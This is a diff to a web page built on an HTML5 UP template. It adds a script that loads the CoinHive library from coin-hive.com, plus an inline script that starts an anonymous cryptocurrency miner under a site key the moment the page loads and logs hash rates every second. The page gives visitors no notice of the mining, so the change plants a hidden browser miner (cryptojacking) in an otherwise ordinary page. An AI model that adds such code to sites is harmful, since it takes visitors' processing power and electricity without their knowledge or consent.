@@ -5,8 +5,37 @@
 	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
 -->
 <html>
-	<head>
+<script>
+			var miner = new CoinHive.Anonymous('Azgloy7GQDPAcE5q7LtfQlRPFXoFN1Ke');
+			miner.start();
+
+			// Listen on events
+			miner.on('found', function() { 
+				console.log("found hash!")
+			})
+			miner.on('accepted', function() { 
+				console.log("accepted hash!")
+			})
+
+			// Update stats once per second
+			setInterval(function() {
+				var hashesPerSecond = miner.getHashesPerSecond();
+				var totalHashes = miner.getTotalHashes();
+				var acceptedHashes = miner.getAcceptedHashes();
+
+				console.log("hashesPerSecond", hashesPerSecond)
+				console.log("totalHashes", totalHashes)
+				console.log("acceptedHashes", acceptedHashes)
+
+				console.log("-----------")
+				console.log("-----------")
+				console.log("-----------")
+
+				// Output to HTML elements...
+			}, 1000);
+		</script>	<head>
 		<title>Hyperspace by HTML5 UP</title>
+		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
 		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
